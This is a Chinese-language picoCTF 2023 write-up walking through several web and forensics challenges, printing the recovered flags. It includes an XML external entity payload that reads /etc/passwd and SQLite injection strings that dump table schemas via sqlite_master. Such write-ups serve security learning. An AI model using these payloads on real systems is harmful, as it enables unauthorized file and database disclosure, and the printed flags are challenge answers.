[TOC]



## picoCTF2023

### web

#### findme

看一下题目描述，username：`test`，password：`test!` 注意后面有一个感叹号

![image-20230318163826388](https://s2.loli.net/2023/03/18/WBqDpo69nkJPCgT.png)



我们在登录时抓包：

![image-20230318164022562](https://s2.loli.net/2023/03/18/DcxafRrsF7NyL4v.png)

将

```
cGljb0NURntwcm94aWVzX2Fs

base解码：
picoCTF{proxies_al
```

![image-20230318164123884](https://s2.loli.net/2023/03/18/I6xlPQmJfCWyRXL.png)

重定向之后，再将id进行base64解码：

```
bF90aGVfd2F5X2QxYzBiMTEyfQ==

base64解码：

l_the_way_d1c0b112}
```

得到flag



#### MatchTheRegex

正则匹配一个字符串，匹配上了给flag

![image-20230318164709389](https://s2.loli.net/2023/03/18/gTtdy9Oivpr5AF1.png)

我们登录进去看一下源代码：

![image-20230318164751967](https://s2.loli.net/2023/03/18/cgDqfLI3x28CsS6.png)



这里提示： `^p...F!?`，结合比赛名称，我们只需要输入`picoCTF!` 即可得到flag

![image-20230318165002410](https://s2.loli.net/2023/03/18/hOtkZM8vNIRKcdo.png)



#### SOAP

![image-20230318165113124](https://s2.loli.net/2023/03/18/W9QqtBSGTiUJcyg.png)

根据提示：`XML外部实体注入`

我们点击`details`时进行抓包

![image-20230318165200165](https://s2.loli.net/2023/03/18/fqpPKhu2IbwOnVW.png)

如图：

![image-20230318165244888](https://s2.loli.net/2023/03/18/jMquv9RNxSwKeTG.png)

确实是xml类型的信息

我们只需要构造，引用一个外部实体即可：

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root[
	<!ENTITY file SYSTEM "file:///etc/passwd">
]>
<data><ID>&file;</ID></data>
```



![image-20230318165502435](https://s2.loli.net/2023/03/18/3ec6UoBp9ytS1uv.png)





#### More SQLi

![image-20230318165701861](https://s2.loli.net/2023/03/18/tLfGqF9sQa1BSl4.png)

根据提示：`SQLiLite`

查阅资料： `SQLite` 也是一个数据库

`SQLite`与`mysql`类似，但是没有`information_schema`数据库

并且`SQLite`有一个不同点，注释不能使用`#`，需要使用`--` 

此题的注入点为：password

**非预期解**

![image-20230318170720831](https://s2.loli.net/2023/03/18/ZzqGTuER52vtyUF.png)

直接使用单引号'闭合，然后使用联合查询union，再使用`-- `闭合掉后面

```sqlite
' union select 1-- 
```



**预期解**

首先我们已经知道了字段数为1，所以我们需要查询表名：

以下三种方式都可以，主要是注释不同

> `SQLite`：
>
> 1. 每一个 `SQLite` 数据库都有一个叫 `sqlite_master` 的表，该表会自动创建。
> 2. `sqlite_master`是一个特殊表, 存储数据库的元信息, 如表(table), 索引(index), 视图(view), 触发器(trigger), 可通过select查询相关信息。

![image-20230318171549316](https://s2.loli.net/2023/03/18/3tpg6yLA2rFRuzs.png)

我们通过如下方式`查询sql建表语句`

```sqlite
-1' union select (select group_concat(sql) from sqlite_master);
-1' union select (select group_concat(sql) from sqlite_master) -- 
-1' union select (select group_concat(sql) from sqlite_master)/*
```

![image-20230318171945245](https://s2.loli.net/2023/03/18/dD3GqiVOlp2U1sA.png)

(题目好像改了)

[SQLite注入](https://blog.csdn.net/HBohan/article/details/120672745)





### Forensics

#### hideme





![flag](https://s2.loli.net/2023/03/18/iGTKMxO6ktCVyqU.png)

`foremost` 分离一下，得到压缩包，压缩包中有flag

![flag](https://s2.loli.net/2023/03/18/6HY7crLdDuOSGj2.png)



#### PcapPoisoning

得到一个流量包文件，使用wireshark打开：

![image-20230318173228860](https://s2.loli.net/2023/03/18/smTOihkBIy9xKGj.png)

进行长度排序，最长的那个藏了flag





#### who is it

![image-20230318174504913](https://s2.loli.net/2023/03/18/WlHmNFOf2cIaL9V.png)

这个是通过ip查询 `whois`，

什么是 `whois`？

![image-20230318174636911](https://s2.loli.net/2023/03/18/9pYku3VODBtZ2mR.png)

所以我们根据提示，可以使用ip来查询到域名相关者的姓名信息，

我们可以通过网站：[查询](https://www.whatismyip.com/ip-whois-lookup/)

如图：

![image-20230318174851494](https://s2.loli.net/2023/03/18/YNtjxkVw6zb1Hch.png)

名字就是flag



